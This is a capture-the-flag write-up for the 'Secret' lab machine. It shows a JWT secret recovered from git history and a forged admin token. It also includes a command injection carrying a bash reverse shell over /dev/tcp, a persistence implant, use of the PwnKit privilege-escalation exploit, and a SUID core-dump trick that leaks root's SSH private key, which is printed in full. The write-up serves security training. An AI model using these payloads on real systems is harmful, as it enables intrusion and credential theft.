# Secret Writeup

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.120 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.120`.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Nginx (DUMB Docs)

Clicking "Download Source Code" on the main page downloads a `files.zip` containing a Node.js Express application. Clicking on any of the 6 sections highlighted on the main page links to some documentation for the downloaded/running application.

We copy the documentation and run the following to create a user:

```
curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"name": "dan1977", "email": "dan@google.com", "password": "password"}' \
  http://10.10.11.120/api/user/register
```

Output: `{"user":"dan1977"}`

Let's sign in with the user we just created:

```
curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"email": "dan@google.com", "password": "password"}' \
  http://10.10.11.120/api/user/login 
```

Output: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBkZDU4NzIwMWExZDA0NWQyMGU5YTQiLCJuYW1lIjoiZGFuMTk3NyIsImVtYWlsIjoiZGFuQGdvb2dsZS5jb20iLCJpYXQiOjE2NDUwNzM4MzF9.hlZPd6A33IjeRfBx8Qh_WNgI1y5-8R9FIoZbfg7Bd5g`

The documentation says we can use this auth token to access `/api/priv` and see our account type.

```
curl http://10.10.11.120/api/priv --header "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBkZDU4NzIwMWExZDA0NWQyMGU5YTQiLCJuYW1lIjoiZGFuMTk3NyIsImVtYWlsIjoiZGFuQGdvb2dsZS5jb20iLCJpYXQiOjE2NDUwNzM4MzF9.hlZPd6A33IjeRfBx8Qh_WNgI1y5-8R9FIoZbfg7Bd5g"
```

Output: `{"role":{"role":"you are normal user","desc":"dan1977"}}`

### Source Code

Let's explore the source code we downloaded and extracted from `files.zip`.

If we look in the `local-web/routes/private.js` file, we see this function:

```js
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

So, if we are able to get access to the account with username `theadmin` we can use the `/api/logs` endpoint to perform a command injection. Performing a GET request to `/api/logs` will use node.js's `exec` to run `git log --oneline [OUR INPUT]`. Therefore, we can send a request to `http://10.10.11.120/api/logs?file=.;[OUR COMMAND]` to run arbitrary commands.

The aforementioned `/api/logs` endpoint uses the `verifytoken` function from `local-web/routes/verifytoken.js`:

```js
module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```

So, the `username` is contained in a JWT. Therefore, we need to find out the value of the `process.env.TOKEN_SECRET` so we can modify the `username` and change it to `theadmin`.

### Git Repository

The folder we downloaded with the code is also a git repo (there is a `.git` folder). We can run `git log` to see what commits have been made:

```
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

commit 3a367e735ee76569664bf7754eaaade7c735d702
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:26:39 2021 +0530

    added downloads

commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:25:52 2021 +0530

    first commit
```

Commit `67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78` has the message message `removed .env for security reasons`, which is interesting since the `.env` file looks like this:

```
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

This old commit might have the `TOKEN_SECRET`, which would enable us to sign a modified JWT and change our username to `theadmin`.

Try `git checkout de0a46b5107a2f4d26e348303e76d85ae4870934` (which is the commit right before the `.env` file was removed).

Now, the `.env` file contains the `TOKEN_SECRET`:

```
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

So, now we can sign the JWT with the `name` field changed to `theadmin`.

### Foothold

We can use [JWT.io](https://jwt.io) to get a new token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBkZDU4NzIwMWExZDA0NWQyMGU5YTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRhbkBnb29nbGUuY29tIiwiaWF0IjoxNjQ1MDczODMxfQ.OcsMCcyhgjPB36m6enq6lSGzbRD82z9Hn5OdrBFJ8Rc`.

Now, let's see if we are admin with `curl http://10.10.11.120/api/priv --header "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBkZDU4NzIwMWExZDA0NWQyMGU5YTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRhbkBnb29nbGUuY29tIiwiaWF0IjoxNjQ1MDczODMxfQ.OcsMCcyhgjPB36m6enq6lSGzbRD82z9Hn5OdrBFJ8Rc"`, which returns `{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}`. So, we are now admin.

Let's try out the command injection we found with the `/api/logs` endpoint: `curl --header "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBkZDU4NzIwMWExZDA0NWQyMGU5YTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRhbkBnb29nbGUuY29tIiwiaWF0IjoxNjQ1MDczODMxfQ.OcsMCcyhgjPB36m6enq6lSGzbRD82z9Hn5OdrBFJ8Rc" "http://10.10.11.120/api/logs?file=;whoami"` returns `"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\ndasith\n"`.

The `dasith` is the output of our `whoami` command, so it looks like everything worked as expected.

We can get `user.txt` flag with `curl --header "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBkZDU4NzIwMWExZDA0NWQyMGU5YTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRhbkBnb29nbGUuY29tIiwiaWF0IjoxNjQ1MDczODMxfQ.OcsMCcyhgjPB36m6enq6lSGzbRD82z9Hn5OdrBFJ8Rc" "http://10.10.11.120/api/logs?file=.;cat%20../user.txt"` (the `%20` is a URL encoded space).

Let's get a reverse shell. We can use the standard bash reverse shell: `bash -c 'bash -i >& /dev/tcp/10.10.14.55/48253 0>&1'`. Let's also organize our `curl` command using `--data-urlencode`, which will automatically take care of the spaces in our payload. We must also specify `-G` so that `curl` knows to make a GET request. We can start a listener with `pwncat-cs -lp 48253`. Then we can run the final exploit command, which is is `curl -G --header "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjBkZDU4NzIwMWExZDA0NWQyMGU5YTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRhbkBnb29nbGUuY29tIiwiaWF0IjoxNjQ1MDczODMxfQ.OcsMCcyhgjPB36m6enq6lSGzbRD82z9Hn5OdrBFJ8Rc" "http://10.10.11.120/api/logs" --data-urlencode "file=;bash -c 'bash -i >& /dev/tcp/10.10.14.55/48253 0>&1'"`.

This command pops the shell and the command will eventually return this output `{"killed":false,"code":1,"signal":null,"cmd":"git log --oneline ;bash -c 'bash -i >& /dev/tcp/10.10.14.55/48253 0>&1'"}`, but the reverse shell will stay active.

## Lateral Movement

Then, we can get persistance with `pwncat` by running `run implant.authorized_key key=/home/kali/.ssh/id_rsa`. Now, we should be able to reconnect with `pwncat-cs dasith@10.10.11.120 --identity /home/kali/.ssh/id_rsa`, but this doesn't work. I set the permissions of the `.ssh` folder to be what they should be with `chmod 700 .ssh && chmod 600 .ssh/authorized_keys`, which fixed the issue.

Upload LinPEAS with `upload linpeas.sh` then run with `bash linpeas.sh`.

LinPEAS immediately tells us that the version of `sudo` installed is vulnerable to `CVE-2021-4034` and `CVE-2021-3560`. For more information about these exploits see my [Paper](../Paper/README.md) and [Horizontall](../Horizontall/README.md) writeups. Let's try `CVE-2021-4034`. `CVE-2021-4034` is a [very recent exploit](https://access.redhat.com/security/cve/CVE-2021-4034) ([disclosed to public on January 25th, 2022](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)). Downloading [berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034) as a ZIP file, copying the file over, unzipping it, running `make` in the directory, and then executing `./cve-2021-4034` gets us a root shell.

We can now run `cat /root/root.txt` to get the root flag. However, `CVE-2021-4034` was probably not the intended solution since this box was published before that exploit was found.

For fun, let's see if `CVE-2021-3560` would also work: The [secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) repo seems to work the best at the time of writing. [Download the script](https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh), upload it to the target machine, and then run it like so: `./poc.sh -u=john -p=john`. This fails with the error `Accounts service and Gnome-Control-Center NOT found!!`, so it looks like `CVE-2021-3560` won't work.

## Privilege Escalation

Now, on to the expected exploit. Looking over the LinPEAS output, the `SUID` section shows the following:

```
-rwsr-xr-x 1 root root 18K Oct  7 10:03 /opt/count (Unknown SUID binary)
```

`/opt/count` is a SUID binary that is not normal on linux machines. This is almost certainly our privilege escalation vector.

If we investigated `/opt` we find a `code.c` file with the source code to the `count` `SUID` binary:

```c++
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

We run `cat /proc/sys/fs/suid_dumpable` to get `2`, which means `SUID` binaries can create core dumps. We can load the `/root/root.txt` file in memory and then purposely crash the program to create a coredump of the program's memory, which will have the loaded `root.txt` flag in it. Searching for how to crash the program and cause a coredump finds [this StackOverflow answer](https://stackoverflow.com/a/5648539), but we need to use `SIGSEGV` to cause an actual crash not just the quit command.

This [Unix StackExchange answer](https://unix.stackexchange.com/a/15534) describes the vulnerability: "The core dump contains a copy of everything which was in memory at the time of the fault. If the program is running suid, that means it needs access to something which you, as a user, do not have access to. If the program gets that information then dumps core, you'll be able to read that privileged information."

So, we will run the program, enter the path to `root.txt` to load it into the program's memory, then we will kill the program, and then return to the program to cause the core dump.

```
(remote) dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
(remote) dasith@secret:/opt$ ps
    PID TTY          TIME CMD
  31803 pts/1    00:00:00 bash
  31925 pts/1    00:00:00 bash
  32288 pts/1    00:00:00 count
  32292 pts/1    00:00:00 ps
(remote) dasith@secret:/opt$ kill -SIGSEGV 32288
(remote) dasith@secret:/opt$ fg
./count
Segmentation fault (core dumped)
```

We see that this is an Ubnutu machine with `cat /etc/issue*` and searching online for where coredumps are in Ubuntu finds [this Ubuntu StackExchange answer](https://askubuntu.com/a/1109747). So, they are in `/var/crash/`. This Ubuntu StackExchange answer says that Apport handles the coredumps. Going to the offical Apport page on [Ubuntu's wiki](https://wiki.ubuntu.com/Apport#Tools) mentions several tools including `apport-unpack`, which is "most useful for extracting the core dump," which is what we want to do. We can extract the coredump with `apport-unpack _opt_count.1000.crash /tmp/crash-report`.

Now, the `CoreDump` file at `/tmp/crash-report/CoreDump` is a binary file so trying to view it with `cat` doesn't work well. We can instead use the `string` command so view the strings within it since the contents of `/root/root.txt` should be in there. We can get the `root.txt` flag in one command with `strings CoreDump | grep -e "[0-9a-f]\{32\}"`. This pipes the strings from `CoreDump` into `grep`, which searches for a regular expression that matches MD5 hashes (regex from [this StackOverflow answer](https://stackoverflow.com/a/4505675)).

To get a root shell we can use the same technique to view the `/root/.ssh/id_rsa` file, which will be `root`'s SSH private key.

```
(remote) dasith@secret:/opt$ ./count
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
(remote) dasith@secret:/opt$ ps
    PID TTY          TIME CMD
  31803 pts/1    00:00:00 bash
  31925 pts/1    00:00:00 bash
  32477 pts/1    00:00:00 count
  32481 pts/1    00:00:00 ps
(remote) dasith@secret:/opt$ kill -SIGSEGV 32477
(remote) dasith@secret:/opt$ fg
./count
Segmentation fault (core dumped)
```

Unpack with `apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report2` and find the private key with `strings /tmp/crash-report2/CoreDump | grep -A 40 "BEGIN OPENSSH PRIVATE KEY"`. `-A 40` gets 40 lines after the matched text.

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Use `nano secret_root_key` and paste in the private key. Set the permissions for the key so that SSH will accept it: `chmod 600 secret_root_key`. Then, get a root SSH shell with `ssh root@10.10.11.120 -i secret_root_key`.
